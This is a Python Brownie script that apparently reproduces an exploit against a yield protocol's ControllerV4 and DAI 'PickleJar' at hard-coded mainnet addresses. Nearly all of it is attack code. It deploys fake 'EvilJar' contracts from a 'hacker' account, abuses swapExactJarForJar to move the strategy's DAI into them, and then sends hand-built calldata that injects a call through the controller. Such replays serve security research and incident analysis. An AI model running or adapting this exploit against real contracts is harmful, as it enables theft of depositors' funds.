from brownie import rpc, accounts, interface, EvilJar, EvilJar2, EvilJar3
from tabulate import tabulate


def main():
    assert rpc.is_active()
    hacker = accounts[0]
    controller = interface.ControllerV4("0x6847259b2B3A4c17e7c43C54409810aF48bA5210")
    dai = interface.ERC20("0x6B175474E89094C44Da98b954EedeAC495271d0F")
    cdai = interface.ERC20("0x5d3a536E4D6DbD6114cc1Ead35777bAB948E3643")
    dai_jar = interface.PickleJar(controller.jars(dai))
    evil_jar_from = EvilJar.deploy(dai, {"from": hacker})
    evil_jar_to = EvilJar2.deploy(cdai, {"from": hacker})
    evil_jar_curve = EvilJar3.deploy(cdai, {"from": hacker})
    strategy = interface.Strategy(controller.strategies(dai))
    from_amount = strategy.getSuppliedUnleveraged.call()
    print("strategy", strategy)
    print("strategy dai balance", strategy.getSuppliedUnleveraged.call().to("ether"))
    contracts = {
        "controller": controller,
        "strategy": strategy,
        "jar 1": evil_jar_from,
        "jar 2": evil_jar_to,
        "jar 3": evil_jar_curve,
        "hacker": hacker,
        "jar": dai_jar,
    }

    def status():
        data = []
        for name, c in contracts.items():
            data.append([name, dai.balanceOf(c).to("ether"), cdai.balanceOf(c) / 1e8])
        print(tabulate(data, headers=["contract", "dai", "cdai"]))

    status()

    tx = controller.swapExactJarForJar(
        evil_jar_from,
        evil_jar_to,
        from_amount,
        0,
        [],
        [],
        {"from": hacker},
    )

    status()

    for i in range(3):
        dai_jar.earn({"from": hacker})

    status()

    tx = controller.swapExactJarForJar(
        evil_jar_from,
        evil_jar_to,
        0,
        0,
        ["0x6186e99d9cfb05e1fdf1b442178806e81da21dd8"],
        [
            f"0x49af32a5000000000000000000000000cd892a97951d46615484359355e3ed88131f829d51cff8d90000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000010000000000000000000000000000000000000000000000000000000000000000000000000000000000000000{str(evil_jar_curve)[2:]}"
        ],
        {"from": hacker},
    )

    status()


def balances():
    jars = {
        "psCRV-v2": "0x68d14d66B2B0d6E157c06Dc8Fefa3D8ba0e66a89",
        "prenCRV": "0x2E35392F4c36EBa7eCAFE4de34199b2373Af22ec",
        "p3CRV": "0x1BB74b5DdC1f4fC91D6f9E7906cf68bc93538e33",
        "pUNIETHDAI-v2": "0xCffA068F1E44D98D3753966eBd58D4CFe3BB5162",
        "pUNIUSDC-v2": "0x53Bf2E62fA20e2b4522f05de3597890Ec1b352C6",
        "pUNIUSDT-v2": "0x09FC573c502037B149ba87782ACC81cF093EC6ef",
        "pUNIWBTC": "0xc80090AA05374d336875907372EE4ee636CBC562",
        "pDAI": "0x6949Bb624E8e8A90F87cD2058139fcd77D2F3F87",
    }
    for name in jars:
        jar = PickleJar.at(jars[name])
        print(name, jar.balance() / 10 ** jar.decimals(), jar.token())
